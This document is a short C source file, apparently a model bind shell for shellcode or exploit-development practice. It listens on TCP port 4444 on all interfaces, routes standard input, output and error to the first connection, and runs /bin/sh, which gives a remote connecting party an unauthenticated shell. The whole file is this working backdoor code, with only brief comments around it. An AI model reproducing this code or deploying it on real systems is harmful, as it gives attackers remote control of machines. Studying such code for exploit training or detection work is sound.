/* bind_shell_model.c
 *  - Bind to a socket, listen for a connection, provide shell.
 */

#include <sys/socket.h>	// socket, AF_INET, SOCK_STREAM
#include <unistd.h>	// dup2
#include <netinet/in.h>	// sockaddr, htons, INADDR_ANY

int main() {
	int port = 4444;
	int sockfd, connfd;
	struct sockaddr_in sockaddr;

	// Build socket

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// Bind to socket

	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);
	sockaddr.sin_addr.s_addr = INADDR_ANY;
	bind(sockfd, (struct sockaddr *) &sockaddr, sizeof(sockaddr));

	// Listen on socket

	listen(sockfd, 0);

	// Accept a connection

	connfd = accept(sockfd, 0, 0);

	// Route i/o through connection

	dup2(connfd, 0);
	dup2(connfd, 1);
	dup2(connfd, 2);

	// Execute /bin/sh

	execve("/bin/sh", 0, 0);

	return 0;
}
